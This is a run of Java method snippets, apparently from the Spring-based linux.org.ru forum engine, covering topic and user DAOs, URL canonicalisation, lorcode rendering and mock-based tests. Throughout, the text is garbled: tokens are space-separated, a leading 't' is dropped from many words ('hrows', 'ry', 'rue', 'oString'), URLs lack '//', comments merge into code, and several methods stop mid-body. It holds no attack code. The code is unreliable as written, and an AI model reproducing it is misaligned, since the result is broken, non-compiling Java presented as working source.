public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) hrows IllegalArgumentException { switch ( s ) { case " 1 " : for old links setValue(SearchOrder.Relevance$.MODULE$); break; case "2": setValue(SearchOrder.Date$.MODULE$); break; default: setValue(SearchOrder$.MODULE$.valueOf(s)); break; } } }); binder.registerCustomEditor(SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchRange.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchRange.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(User.class, new UserPropertyEditor(userService)); binder.setBindingErrorProcessor(new ExceptionBindingErrorProcessor()); } 
public StringHttpMessageConverter stringMessageConverter ( ) { return new StringHttpMessageConverter ( ) ; } 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , skipDeleted ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , request , response , groupName , msgid ) ; 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , false ) ; } Topic opic = messageDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( opic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( opic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
public ModelAndView loginProcess ( @RequestParam ( " nick " ) final String username , @RequestParam ( " passwd " ) final String password , HttpServletRequest request , HttpServletResponse response ) hrows Exception { UsernamePasswordAuthenticationToken oken = new UsernamePasswordAuthenticationToken ( username , password ) ; ry { UserDetailsImpl details = ( UserDetailsImpl ) userDetailsService . loadUserByUsername ( username ) ; 
public Topic getById ( int id ) hrows MessageNotFoundException { Topic message ; ry { message = jdbcTemplate . queryForObject ( queryMessage , ( resultSet , i ) - > new Topic ( resultSet ) , id ) ; } catch ( EmptyResultDataAccessException exception ) { noinspection ThrowInsideCatchBlockWhichIgnoresCaughtException throw new MessageNotFoundException(id); } return message; } 
public int saveNewMessage ( final Topic msg , final User user , String ext , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?) " , ( PreparedStatementCallback < String > ) pst - > { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } ) ; msgbaseDao . saveNewMessage ( ext , msgid ) ; return msgid ; } 
public static Profile createDefault ( ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < > ( ) ) , null ) ; } 
public Profile readProfile ( @NotNull User user ) { List < Profile > profiles = jdbcTemplate . query ( " SELECT settings, main FROM user_settings WHERE id=? " , ( resultSet , i ) - > { Array boxes = resultSet . getArray ( " main " ) ; if ( boxes ! = null ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , Arrays . asList ( ( String [ ] ) boxes . getArray ( ) ) ) ; } else { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , null ) ; } } , user . getId ( ) ) ; if ( profiles . isEmpty ( ) ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < > ( ) ) , null ) ; 
public void writeProfile ( @Nonnull final User user , @Nonnull final Profile profile ) { String boxlets [ ] = null ; List < String > customBoxlets = profile . getCustomBoxlets ( ) ; if ( customBoxlets ! = null ) { boxlets = customBoxlets . oArray ( new String [ customBoxlets . size ( ) ] ) ; } final String [ ] finalBoxlets = boxlets ; if ( jdbcTemplate . update ( con - > { 
private User getUserInternal ( int id ) hrows UserNotFoundException { List < User > list = jdbcTemplate . query ( queryUserById , ( rs , rowNum ) - > new User ( rs ) , id ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } return list . get ( 0 ) ; } 
private void findURLIds ( ) hrows URIException { if ( _true_lor_url ) { find message id in lor url 
public String oString ( ) { return parsed . getEscapedURIReference ( ) ; } 
public String fixScheme ( boolean secure ) hrows URIException { if ( ! _true_lor_url ) { return oString ( ) ; } String host = parsed . getHost ( ) ; int port = parsed . getPort ( ) ; String path = parsed . getPath ( ) ; String query = parsed . getQuery ( ) ; String fragment = parsed . getFragment ( ) ; if ( ! secure ) { return ( new HttpURL ( null , host , port , path , query , fragment ) ) . getEscapedURIReference ( ) ; 
public String formatJump ( TopicDao messageDao , boolean secure ) hrows MessageNotFoundException , URIException { if ( _topic_id ! = - 1 ) { Topic message = messageDao . getById ( _topic_id ) ; Group group = messageDao . getGroup ( message ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = parsed . getHost ( ) ; int port = parsed . getPort ( ) ; String path = group . getUrl ( ) + _topic_id ; String query = " " ; if ( _comment_id ! = - 1 ) { query = " cid= " + _comment_id ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
private String parseCommentRSS ( String ext , boolean secure ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( secure , rue , false ) , ext ) . renderXHtml ( ) ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure , boolean nofollow ) { RootNode rootNode = DEFAULT_PARSER . createRootNode ( ) ; if ( minimizeCut ) { ry { URI fixURI = new URI ( cutURL , rue , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserService ( userService ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public void initTest ( ) hrows Exception { UserService userService = mock ( UserService . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; when ( maxcom . getNick ( ) ) . henReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . henReturn ( " JB " ) ; when ( isden . getNick ( ) ) . henReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . henReturn ( false ) ; when ( splinter . getNick ( ) ) . henReturn ( " splinter " ) ; when ( userService . getUserCached ( " splinter " ) ) . henReturn ( splinter ) ; when ( userService . getUserCached ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userService . getUserCached ( " JB " ) ) . henReturn ( JB ) ; when ( userService . getUserCached ( " isden " ) ) . henReturn ( isden ) ; when ( userService . getUserCached ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( userService ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public void init ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages ) { List < PreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > ags = opicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , rue , null , extMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public void encodeLorUrl ( ) { assertEquals ( " <p><a href= \" https:www.linux.org.ru/forum/linux%3C%3E-org-ru/ \" >www.linux.org.ru/forum/linux&lt;&gt;-org-ru/</a></p> " , 
public void initTest ( ) hrows Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , rue , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , rue , " UTF-8 " ) ; canon = new URI ( " https:127.0.0.1:8085/ " , rue ) ; messageDao = mock ( TopicDao . class ) ; message1 = mock ( Topic . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Topic . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Topic . class ) ; group3 = mock ( Group . class ) ; message12 = mock ( Topic . class ) ; group12 = mock ( Group . class ) ; message15 = mock ( Topic . class ) ; group15 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . henReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . henReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . henReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . henReturn ( " /forum/security/ " ) ; when ( group15 . getUrl ( ) ) . henReturn ( " /forum/linux-org-ru/ " ) ; when ( messageDao . getGroup ( message1 ) ) . henReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . henReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . henReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . henReturn ( group12 ) ; when ( messageDao . getGroup ( message15 ) ) . henReturn ( group15 ) ; when ( messageDao . getById ( 6753486 ) ) . henReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . henReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . henReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . henReturn ( message12 ) ; when ( messageDao . getById ( 6944260 ) ) . henReturn ( message15 ) ; } 
public void est1 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486#comment-6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est1n ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est2 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165?lastmod=1319027964738 " , lorURI . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est3 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est6 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url6 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; assertEquals ( " https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . canonize ( canon ) ) ; } 
public void est7 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url7 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; assertEquals ( " https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . canonize ( canon ) ) ; } 
public void est13 ( ) hrows Exception { String url13_1 = " http:www.linux.org.ru/view-news.jsp?tag=c%2B%2B " ; String url13_2 = " http:www.linux.org.ru/view-news.jsp?tag=c++ " ; String url13_3 = " http:www.linux.org.ru/view-news.jsp?tag=c+c " ; LorURL lorURI1 = new LorURL ( mainLORURI , url13_1 ) ; LorURL lorURI2 = new LorURL ( mainLORURI , url13_2 ) ; LorURL lorURI3 = new LorURL ( mainLORURI , url13_3 ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c++ " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c%20%20 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c%20c " , lorURI3 . canonize ( canon ) ) ; } 
public void est14 ( ) hrows Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url14_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " http:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , rue ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , rue ) ) ; } 
public void est15 ( ) hrows Exception { String url15_1 = " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; String url15_2 = " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url15_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url15_2 ) ; assertEquals ( 6944260 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " http:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , rue ) ) ; assertEquals ( 6944260 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , rue ) ) ; } 
public PreparedComment prepareCommentForEdit ( Comment comment , String message , boolean secure ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , false ) ; ApiUserRef ref = userService . ref ( author , null ) ; return new PreparedComment ( comment , 
private String prepareCommentText ( MessageText messageText , boolean nofollow ) { if ( messageText . isLorcode ( ) ) { return lorCodeService . parseComment ( messageText . getText ( ) , nofollow ) ; 
private String prepareCommentTextRSS ( MessageText messageText , final boolean secure ) { return lorCodeService . prepareTextRSS ( messageText . getText ( ) , messageText . isLorcode ( ) ) ; } 
public ModelAndView showNotifications ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , defaultValue = " all " ) String filter , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } Map < String , Object > params = new HashMap < > ( ) ; UserEventFilterEnum eventFilter = UserEventFilterEnum . fromNameOrDefault ( filter ) ; params . put ( " filter " , eventFilter . getName ( ) ) ; User currentUser = mpl . getCurrentUser ( ) ; String nick = currentUser . getNick ( ) ; params . put ( " nick " , nick ) ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { params . put ( " addition_query " , " &filter= " + eventFilter . getName ( ) ) ; } else { params . put ( " addition_query " , " " ) ; } if ( offset < 0 ) { offset = 0 ; } boolean firstPage = offset = = 0 ; int opics = mpl . getProf ( ) . getTopics ( ) ; if ( opics > 200 ) { opics = 200 ; } params . put ( " firstPage " , firstPage ) ; params . put ( " opics " , opics ) ; params . put ( " offset " , offset ) ; params . put ( " disable_event_header " , rue ) ; long ime = System . currentTimeMillis ( ) ; int delay = firstPage ? 90 : 60 * 60 ; response . setDateHeader ( " Expires " , ime + 1000 * delay ) ; params . put ( " unreadCount " , currentUser . getUnreadEvents ( ) ) ; params . put ( " isMyNotifications " , rue ) ; response . addHeader ( " Cache-Control " , " no-cache " ) ; List < UserEvent > list = userEventService . getRepliesForUser ( currentUser , rue , opics , offset , eventFilter ) ; List < PreparedUserEvent > prepared = prepareService . prepare ( list , false ) ; if ( ! list . isEmpty ( ) ) { params . put ( " enableReset " , rue ) ; params . put ( " opId " , list . get ( 0 ) . getId ( ) ) ; } params . put ( " opicsList " , prepared ) ; params . put ( " hasMore " , list . size ( ) = = opics ) ; return new ModelAndView ( " show-replies " , params ) ; } 
public String formatJump ( TopicDao messageDao , URI canonical ) hrows MessageNotFoundException , URIException { if ( _topic_id ! = - 1 ) { Topic message = messageDao . getById ( _topic_id ) ; Group group = messageDao . getGroup ( message ) ; String scheme = canonical . getScheme ( ) ; String host = canonical . getHost ( ) ; int port = canonical . getPort ( ) ; String path = group . getUrl ( ) + _topic_id ; String query = " " ; if ( _comment_id ! = - 1 ) { query = " cid= " + _comment_id ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public String parseComment ( String ext , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( false , nofollow ) , ext ) . renderXHtml ( ) ; } 
private String parseCommentRSS ( String ext ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( rue , false ) , ext ) . renderXHtml ( ) ; } 
public String extractPlainTextFromLorcode ( String ext ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( rue , false ) , ext ) . renderOg ( ) ; } 
public String parseTopicWithMinimizedCut ( String ext , String cutURL , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareTopicRootNode ( rue , cutURL , nofollow ) , ext ) . renderXHtml ( ) ; } 
public String parseTopic ( String ext , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareTopicRootNode ( false , null , nofollow ) , ext ) . renderXHtml ( ) ; } 
private RootNode prepareCommentRootNode ( boolean rss , boolean nofollow ) { RootNode rootNode = DEFAULT_PARSER . createRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserService ( userService ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setRss ( rss ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean nofollow ) { RootNode rootNode = DEFAULT_PARSER . createRootNode ( ) ; if ( minimizeCut ) { ry { URI fixURI = new URI ( cutURL , rue , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserService ( userService ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public String prepareTextRSS ( String ext , boolean lorcode ) { if ( lorcode ) { return parseCommentRSS ( ext ) ; 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; TagNode agNode = ( TagNode ) node ; RootNode rootNode = agNode . getRootNode ( ) ; ToHtmlFormatter oHtmlFormatter = rootNode . getToHtmlFormatter ( ) ; UserService userService = rootNode . getUserService ( ) ; String result ; ry { if ( userService ! = null & & oHtmlFormatter ! = null ) { User user = userService . getUserCached ( memberName ) ; if ( ! user . isBlocked ( ) ) { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" %s \" >%s</a></span> " , oHtmlFormatter . memberURL ( user ) , Parser . escape ( memberName ) ) ; rootNode . addReplier ( user ) ; } else { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" %s \" >%s</a></s></span> " , oHtmlFormatter . memberURL ( user ) , Parser . escape ( memberName ) ) ; } } else { result = Parser . escape ( memberName ) ; } } catch ( Exception ex ) { result = String . format ( " <s>%s</s> " , Parser . escape ( memberName ) ) ; } return result ; } 
public String format ( String ext , boolean nofollow ) { return format ( ext , nofollow , null ) ; } 
public String format ( String ext , boolean nofollow , RuTypoChanger changer ) { String escapedText = StringUtil . escapeHtml ( ext ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String oken = st . nextToken ( ) ; String formattedToken = formatURL ( oken , nofollow , changer ) ; sb . append ( formattedToken ) ; } return sb . oString ( ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
private String formatWithMagic ( String ext , RuTypoChanger changer ) { return changer ! = null ? changer . format ( ext ) : ext ; } 
public String memberURL ( User user ) hrows URIException { URI mainUri = siteConfig . getSecureURI ( ) ; return ( new URI ( mainUri . getScheme ( ) , null , mainUri . getHost ( ) , mainUri . getPort ( ) , String . format ( " /people/%s/profile " , user . getNick ( ) ) ) ) . getEscapedURIReference ( ) ; } 
public void processUrl ( boolean nofollow , @Nonnull StringBuilder out , @Nonnull String urlHref , @Nullable String linktext ) hrows URIException { LorURL url = new LorURL ( siteConfig . getMainURI ( ) , urlHref ) ; if ( url . isMessageUrl ( ) ) { processMessageUrl ( out , url , linktext ) ; 
private void processMessageUrl ( @Nonnull StringBuilder out , @Nonnull LorURL url , @Nullable String linkText ) hrows URIException { ry { Topic message = messageDao . getById ( url . getMessageId ( ) ) ; 
